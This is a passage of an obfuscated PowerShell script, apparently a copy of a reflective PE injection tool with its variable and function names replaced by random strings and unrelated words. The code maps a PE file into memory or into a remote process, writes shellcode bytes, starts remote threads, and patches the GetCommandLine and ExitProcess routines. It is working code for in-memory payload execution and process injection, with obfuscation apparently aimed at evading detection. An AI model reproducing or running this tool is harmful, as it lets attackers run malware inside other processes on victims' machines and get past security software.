        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $XdmAcKgP99
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$INMXnVsM99 = [IntPtr](forecastles ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.IMAGE_SECTION_HEADER)))
            $lrScHDCB99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($INMXnVsM99, [Type]$XdmAcKgP99.IMAGE_SECTION_HEADER)
            [IntPtr]$XNQgfgaj99 = forecastles ($PEInfo.PEHandle) ($lrScHDCB99.VirtualAddress)
            
            [UInt32]$uctgNFbX99 = hallways $lrScHDCB99.Characteristics
            [UInt32]$CXBZtOOQ99 = $lrScHDCB99.VirtualSize
            
            [UInt32]$tWqBUEkj99 = 0
            Mormon -BYtPotTf99 "egos::VirtualProtect" -PEInfo $PEInfo -StartAddress $XNQgfgaj99 -Size $CXBZtOOQ99 | Out-Null
            $ZYkkiHnC99 = $ocxmKEPE99.VirtualProtect.Invoke($XNQgfgaj99, $CXBZtOOQ99, $uctgNFbX99, [Ref]$tWqBUEkj99)
            if ($ZYkkiHnC99 -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    Function woodenly
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $ocxmKEPE99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $aWpLkKoK99,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $JynCRITX99
        )
        
        $xCxztZFw99 = @() 
        
        $HBzQDdli99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$tWqBUEkj99 = 0
        
        [IntPtr]$KuYoEJjN99 = $ocxmKEPE99.GetModuleHandle.Invoke("Kernel32.dll")
        if ($KuYoEJjN99 -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$fqvvguSB99 = $ocxmKEPE99.GetModuleHandle.Invoke("KernelBase.dll")
        if ($fqvvguSB99 -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }
        $NeYkifOO99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($aWpLkKoK99)
        $ZbUtzHLi99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($aWpLkKoK99)
    
        [IntPtr]$TWoQGTWc99 = $ocxmKEPE99.GetProcAddress.Invoke($fqvvguSB99, "GetCommandLineA")
        [IntPtr]$pyuTdrKH99 = $ocxmKEPE99.GetProcAddress.Invoke($fqvvguSB99, "GetCommandLineW")
        if ($TWoQGTWc99 -eq [IntPtr]::Zero -or $pyuTdrKH99 -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $TWoQGTWc99. GetCommandLineW: $pyuTdrKH99"
        }
        [Byte[]]$ymyzViHR99 = @()
        if ($HBzQDdli99 -eq 8)
        {
            $ymyzViHR99 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $ymyzViHR99 += 0xb8
        
        [Byte[]]$DbiMqgBy99 = @(0xc3)
        $vgTCcpko99 = $ymyzViHR99.Length + $HBzQDdli99 + $DbiMqgBy99.Length
        
        
        $ATKtCoML99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vgTCcpko99)
        $FCPTEvmA99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vgTCcpko99)
        $ocxmKEPE99.memcpy.Invoke($ATKtCoML99, $TWoQGTWc99, [UInt64]$vgTCcpko99) | Out-Null
        $ocxmKEPE99.memcpy.Invoke($FCPTEvmA99, $pyuTdrKH99, [UInt64]$vgTCcpko99) | Out-Null
        $xCxztZFw99 += ,($TWoQGTWc99, $ATKtCoML99, $vgTCcpko99)
        $xCxztZFw99 += ,($pyuTdrKH99, $FCPTEvmA99, $vgTCcpko99)
        [UInt32]$tWqBUEkj99 = 0
        $ZYkkiHnC99 = $ocxmKEPE99.VirtualProtect.Invoke($TWoQGTWc99, [UInt32]$vgTCcpko99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$tWqBUEkj99)
        if ($ZYkkiHnC99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $sgqTpnFE99 = $TWoQGTWc99
        costarring -Bytes $ymyzViHR99 -echyVupw99 $sgqTpnFE99
        $sgqTpnFE99 = forecastles $sgqTpnFE99 ($ymyzViHR99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ZbUtzHLi99, $sgqTpnFE99, $false)
        $sgqTpnFE99 = forecastles $sgqTpnFE99 $HBzQDdli99
        costarring -Bytes $DbiMqgBy99 -echyVupw99 $sgqTpnFE99
        
        $ocxmKEPE99.VirtualProtect.Invoke($TWoQGTWc99, [UInt32]$vgTCcpko99, [UInt32]$tWqBUEkj99, [Ref]$tWqBUEkj99) | Out-Null
        
        
        [UInt32]$tWqBUEkj99 = 0
        $ZYkkiHnC99 = $ocxmKEPE99.VirtualProtect.Invoke($pyuTdrKH99, [UInt32]$vgTCcpko99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$tWqBUEkj99)
        if ($ZYkkiHnC99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $agpKErnz99 = $pyuTdrKH99
        costarring -Bytes $ymyzViHR99 -echyVupw99 $agpKErnz99
        $agpKErnz99 = forecastles $agpKErnz99 ($ymyzViHR99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($NeYkifOO99, $agpKErnz99, $false)
        $agpKErnz99 = forecastles $agpKErnz99 $HBzQDdli99
        costarring -Bytes $DbiMqgBy99 -echyVupw99 $agpKErnz99
        
        $ocxmKEPE99.VirtualProtect.Invoke($pyuTdrKH99, [UInt32]$vgTCcpko99, [UInt32]$tWqBUEkj99, [Ref]$tWqBUEkj99) | Out-Null
        
        
        $jSPrvrHG99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $jSPrvrHG99)
        {
            [IntPtr]$KxgOEFiW99 = $ocxmKEPE99.GetModuleHandle.Invoke($Dll)
            if ($KxgOEFiW99 -ne [IntPtr]::Zero)
            {
                [IntPtr]$EKnNPDVl99 = $ocxmKEPE99.GetProcAddress.Invoke($KxgOEFiW99, "_wcmdln")
                [IntPtr]$qPTaRSaC99 = $ocxmKEPE99.GetProcAddress.Invoke($KxgOEFiW99, "_acmdln")
                if ($EKnNPDVl99 -eq [IntPtr]::Zero -or $qPTaRSaC99 -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $TNBgVhky99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($aWpLkKoK99)
                $OebaCvpQ99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($aWpLkKoK99)
                
                $hMmoRkzu99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($qPTaRSaC99, [Type][IntPtr])
                $kRaoUcYf99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($EKnNPDVl99, [Type][IntPtr])
                $yHvCiuOg99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HBzQDdli99)
                $iGEFGFHg99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HBzQDdli99)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($hMmoRkzu99, $yHvCiuOg99, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($kRaoUcYf99, $iGEFGFHg99, $false)
                $xCxztZFw99 += ,($qPTaRSaC99, $yHvCiuOg99, $HBzQDdli99)
                $xCxztZFw99 += ,($EKnNPDVl99, $iGEFGFHg99, $HBzQDdli99)
                
                $ZYkkiHnC99 = $ocxmKEPE99.VirtualProtect.Invoke($qPTaRSaC99, [UInt32]$HBzQDdli99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$tWqBUEkj99)
                if ($ZYkkiHnC99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($TNBgVhky99, $qPTaRSaC99, $false)
                $ocxmKEPE99.VirtualProtect.Invoke($qPTaRSaC99, [UInt32]$HBzQDdli99, [UInt32]($tWqBUEkj99), [Ref]$tWqBUEkj99) | Out-Null
                
                $ZYkkiHnC99 = $ocxmKEPE99.VirtualProtect.Invoke($EKnNPDVl99, [UInt32]$HBzQDdli99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$tWqBUEkj99)
                if ($ZYkkiHnC99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OebaCvpQ99, $EKnNPDVl99, $false)
                $ocxmKEPE99.VirtualProtect.Invoke($EKnNPDVl99, [UInt32]$HBzQDdli99, [UInt32]($tWqBUEkj99), [Ref]$tWqBUEkj99) | Out-Null
            }
        }
        
        
        $xCxztZFw99 = @()
        $sZtsZbPD99 = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        [IntPtr]$VaoYFFiZ99 = $ocxmKEPE99.GetModuleHandle.Invoke("mscoree.dll")
        if ($VaoYFFiZ99 -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$XaknAOQQ99 = $ocxmKEPE99.GetProcAddress.Invoke($VaoYFFiZ99, "CorExitProcess")
        if ($XaknAOQQ99 -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $sZtsZbPD99 += $XaknAOQQ99
        
        [IntPtr]$NDPlNiew99 = $ocxmKEPE99.GetProcAddress.Invoke($KuYoEJjN99, "ExitProcess")
        if ($NDPlNiew99 -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $sZtsZbPD99 += $NDPlNiew99
        
        [UInt32]$tWqBUEkj99 = 0
        foreach ($gYGWbAsg99 in $sZtsZbPD99)
        {
            $GEVzMHzg99 = $gYGWbAsg99
            [Byte[]]$ymyzViHR99 = @(0xbb)
            [Byte[]]$DbiMqgBy99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            if ($HBzQDdli99 -eq 8)
            {
                [Byte[]]$ymyzViHR99 = @(0x48, 0xbb)
                [Byte[]]$DbiMqgBy99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$oPSqHcEJ99 = @(0xff, 0xd3)
            $vgTCcpko99 = $ymyzViHR99.Length + $HBzQDdli99 + $DbiMqgBy99.Length + $HBzQDdli99 + $oPSqHcEJ99.Length
            
            [IntPtr]$GyjIyuMD99 = $ocxmKEPE99.GetProcAddress.Invoke($KuYoEJjN99, "ExitThread")
            if ($GyjIyuMD99 -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }
            $ZYkkiHnC99 = $ocxmKEPE99.VirtualProtect.Invoke($gYGWbAsg99, [UInt32]$vgTCcpko99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$tWqBUEkj99)
            if ($ZYkkiHnC99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $stHBDaIt99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vgTCcpko99)
            $ocxmKEPE99.memcpy.Invoke($stHBDaIt99, $gYGWbAsg99, [UInt64]$vgTCcpko99) | Out-Null
            $xCxztZFw99 += ,($gYGWbAsg99, $stHBDaIt99, $vgTCcpko99)
            
            costarring -Bytes $ymyzViHR99 -echyVupw99 $GEVzMHzg99
            $GEVzMHzg99 = forecastles $GEVzMHzg99 ($ymyzViHR99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($JynCRITX99, $GEVzMHzg99, $false)
            $GEVzMHzg99 = forecastles $GEVzMHzg99 $HBzQDdli99
            costarring -Bytes $DbiMqgBy99 -echyVupw99 $GEVzMHzg99
            $GEVzMHzg99 = forecastles $GEVzMHzg99 ($DbiMqgBy99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($GyjIyuMD99, $GEVzMHzg99, $false)
            $GEVzMHzg99 = forecastles $GEVzMHzg99 $HBzQDdli99
            costarring -Bytes $oPSqHcEJ99 -echyVupw99 $GEVzMHzg99
            $ocxmKEPE99.VirtualProtect.Invoke($gYGWbAsg99, [UInt32]$vgTCcpko99, [UInt32]$tWqBUEkj99, [Ref]$tWqBUEkj99) | Out-Null
        }
        Write-Output $xCxztZFw99
    }
    
    
    Function flimsy
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $kuJPaVYi99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $ocxmKEPE99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        [UInt32]$tWqBUEkj99 = 0
        foreach ($Info in $kuJPaVYi99)
        {
            $ZYkkiHnC99 = $ocxmKEPE99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$tWqBUEkj99)
            if ($ZYkkiHnC99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $ocxmKEPE99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $ocxmKEPE99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$tWqBUEkj99, [Ref]$tWqBUEkj99) | Out-Null
        }
    }
    Function wraparounds
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $IzMDqdqW99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $XdmAcKgP99 = sees
        $Win32Constants = gorged
        $PEInfo = guesstimating -IzMDqdqW99 $IzMDqdqW99 -XdmAcKgP99 $XdmAcKgP99 -Win32Constants $Win32Constants
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $nZuUYFLB99 = forecastles ($IzMDqdqW99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $TOBBvkYt99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($nZuUYFLB99, [Type]$XdmAcKgP99.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $TOBBvkYt99.NumberOfNames; $i++)
        {
            $zxSTpwZx99 = forecastles ($IzMDqdqW99) ($TOBBvkYt99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $rztYVzzj99 = forecastles ($IzMDqdqW99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($zxSTpwZx99, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($rztYVzzj99)
            if ($Name -ceq $FunctionName)
            {
                $snqASVut99 = forecastles ($IzMDqdqW99) ($TOBBvkYt99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $eYlxMmzx99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($snqASVut99, [Type][UInt16])
                $uvxHtCVE99 = forecastles ($IzMDqdqW99) ($TOBBvkYt99.AddressOfFunctions + ($eYlxMmzx99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $lHXpPMrS99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($uvxHtCVE99, [Type][UInt32])
                return forecastles ($IzMDqdqW99) ($lHXpPMrS99)
            }
        }
        
        return [IntPtr]::Zero
    }
    Function sickened
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $VPcmXnGz99,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $VqCLAkop99,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $saVngXfx99
        )
        
        $HBzQDdli99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $Win32Constants = gorged
        $ocxmKEPE99 = supervision
        $XdmAcKgP99 = sees
        
        $RSymZJNq99 = $false
        if (($saVngXfx99 -ne $null) -and ($saVngXfx99 -ne [IntPtr]::Zero))
        {
            $RSymZJNq99 = $true
        }
        
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = unattached -VPcmXnGz99 $VPcmXnGz99 -XdmAcKgP99 $XdmAcKgP99
        $tZDALMMB99 = $PEInfo.OriginalImageBase
        $bCswmbki99 = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $bCswmbki99 = $false
        }
        
        
        $PEKfIQKY99 = $true
        if ($RSymZJNq99 -eq $true)
        {
            $KuYoEJjN99 = $ocxmKEPE99.GetModuleHandle.Invoke("kernel32.dll")
            $RtFnvHTY99 = $ocxmKEPE99.GetProcAddress.Invoke($KuYoEJjN99, "IsWow64Process")
            if ($RtFnvHTY99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$dMVdQHTl99 = $false
            $ZYkkiHnC99 = $ocxmKEPE99.IsWow64Process.Invoke($saVngXfx99, [Ref]$dMVdQHTl99)
            if ($ZYkkiHnC99 -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($dMVdQHTl99 -eq $true) -or (($dMVdQHTl99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $PEKfIQKY99 = $false
            }
            
            $oRjuWxKb99 = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $oRjuWxKb99 = $false
            }
            if ($oRjuWxKb99 -ne $PEKfIQKY99)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PEKfIQKY99 = $false
            }
        }
        if ($PEKfIQKY99 -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        [IntPtr]$wdvQfknG99 = [IntPtr]::Zero
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$wdvQfknG99 = $tZDALMMB99
        }
        $IzMDqdqW99 = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $vOiFCJfi99 = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $IzMDqdqW99. If it is loaded in a remote process, this is the address in the remote process.
        if ($RSymZJNq99 -eq $true)
        {
            $IzMDqdqW99 = $ocxmKEPE99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            $vOiFCJfi99 = $ocxmKEPE99.VirtualAllocEx.Invoke($saVngXfx99, $wdvQfknG99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($vOiFCJfi99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($bCswmbki99 -eq $true)
            {
                $IzMDqdqW99 = $ocxmKEPE99.VirtualAlloc.Invoke($wdvQfknG99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $IzMDqdqW99 = $ocxmKEPE99.VirtualAlloc.Invoke($wdvQfknG99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $vOiFCJfi99 = $IzMDqdqW99
        }
        
        [IntPtr]$FXxAyvSE99 = forecastles ($IzMDqdqW99) ([Int64]$PEInfo.SizeOfImage)
        if ($IzMDqdqW99 -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($VPcmXnGz99, 0, $IzMDqdqW99, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = guesstimating -IzMDqdqW99 $IzMDqdqW99 -XdmAcKgP99 $XdmAcKgP99 -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $FXxAyvSE99
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $vOiFCJfi99
        Write-Verbose "StartAddress: $IzMDqdqW99    EndAddress: $FXxAyvSE99"
        
        
        Write-Verbose "Copy PE sections in to memory"
        opinionated -VPcmXnGz99 $VPcmXnGz99 -PEInfo $PEInfo -ocxmKEPE99 $ocxmKEPE99 -XdmAcKgP99 $XdmAcKgP99
        
        
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        comity -PEInfo $PEInfo -tZDALMMB99 $tZDALMMB99 -Win32Constants $Win32Constants -XdmAcKgP99 $XdmAcKgP99
        
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RSymZJNq99 -eq $true)
        {
            exile -PEInfo $PEInfo -ocxmKEPE99 $ocxmKEPE99 -XdmAcKgP99 $XdmAcKgP99 -Win32Constants $Win32Constants -saVngXfx99 $saVngXfx99
        }
        else
        {
            exile -PEInfo $PEInfo -ocxmKEPE99 $ocxmKEPE99 -XdmAcKgP99 $XdmAcKgP99 -Win32Constants $Win32Constants
        }
        
        
        if ($RSymZJNq99 -eq $false)
        {
            if ($bCswmbki99 -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                egos -PEInfo $PEInfo -ocxmKEPE99 $ocxmKEPE99 -Win32Constants $Win32Constants -XdmAcKgP99 $XdmAcKgP99
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        if ($RSymZJNq99 -eq $true)
        {
            [UInt32]$BOGmSWJa99 = 0
            $ZYkkiHnC99 = $ocxmKEPE99.WriteProcessMemory.Invoke($saVngXfx99, $vOiFCJfi99, $IzMDqdqW99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$BOGmSWJa99)
            if ($ZYkkiHnC99 -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RSymZJNq99 -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $FGfqyKEy99 = forecastles ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $EfnvJKid99 = treadled @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $Yvejqlty99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FGfqyKEy99, $EfnvJKid99)
                
                $Yvejqlty99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $FGfqyKEy99 = forecastles ($vOiFCJfi99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    $RdtbRteE99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $RaMjbMeD99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $MefqbZEt99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    $RdtbRteE99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $RaMjbMeD99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $MefqbZEt99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $vpLElTks99 = $RdtbRteE99.Length + $RaMjbMeD99.Length + $MefqbZEt99.Length + ($HBzQDdli99 * 2)
                $deppxZuZ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vpLElTks99)
                $TqHcjJFG99 = $deppxZuZ99
                
                costarring -Bytes $RdtbRteE99 -echyVupw99 $deppxZuZ99
                $deppxZuZ99 = forecastles $deppxZuZ99 ($RdtbRteE99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($vOiFCJfi99, $deppxZuZ99, $false)
                $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
                costarring -Bytes $RaMjbMeD99 -echyVupw99 $deppxZuZ99
                $deppxZuZ99 = forecastles $deppxZuZ99 ($RaMjbMeD99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($FGfqyKEy99, $deppxZuZ99, $false)
                $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
                costarring -Bytes $MefqbZEt99 -echyVupw99 $deppxZuZ99
                $deppxZuZ99 = forecastles $deppxZuZ99 ($MefqbZEt99.Length)
                
                $ULbprPTI99 = $ocxmKEPE99.VirtualAllocEx.Invoke($saVngXfx99, [IntPtr]::Zero, [UIntPtr][UInt64]$vpLElTks99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($ULbprPTI99 -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $ZYkkiHnC99 = $ocxmKEPE99.WriteProcessMemory.Invoke($saVngXfx99, $ULbprPTI99, $TqHcjJFG99, [UIntPtr][UInt64]$vpLElTks99, [Ref]$BOGmSWJa99)
                if (($ZYkkiHnC99 -eq $false) -or ([UInt64]$BOGmSWJa99 -ne [UInt64]$vpLElTks99))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }
                $sfHoDRoM99 = firewater -sHbeaXaO99 $saVngXfx99 -StartAddress $ULbprPTI99 -ocxmKEPE99 $ocxmKEPE99
                $RtFnvHTY99 = $ocxmKEPE99.WaitForSingleObject.Invoke($sfHoDRoM99, 20000)
                if ($RtFnvHTY99 -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $ocxmKEPE99.VirtualFreeEx.Invoke($saVngXfx99, $ULbprPTI99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            [IntPtr]$JynCRITX99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($JynCRITX99, 0, 0x00)
            $FIXgNWLc99 = woodenly -PEInfo $PEInfo -ocxmKEPE99 $ocxmKEPE99 -Win32Constants $Win32Constants -aWpLkKoK99 $VqCLAkop99 -JynCRITX99 $JynCRITX99
            [IntPtr]$lHLrlIJr99 = forecastles ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $lHLrlIJr99. Creating thread for the EXE to run in."
            $ocxmKEPE99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $lHLrlIJr99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
            while($true)
            {
                [Byte]$EGZCooel99 = [System.Runtime.InteropServices.Marshal]::ReadByte($JynCRITX99, 0)
                if ($EGZCooel99 -eq 1)
                {
                    flimsy -kuJPaVYi99 $FIXgNWLc99 -ocxmKEPE99 $ocxmKEPE99 -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $vOiFCJfi99)
    }
    
    
    Function testaments
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $IzMDqdqW99
        )
        
        $Win32Constants = gorged
        $ocxmKEPE99 = supervision
